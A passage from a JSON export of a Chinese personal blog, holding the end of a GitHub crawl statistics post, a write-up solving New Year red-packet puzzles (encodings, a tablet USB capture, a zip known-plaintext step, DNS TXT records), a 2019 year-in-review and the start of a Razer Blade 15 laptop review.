不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" 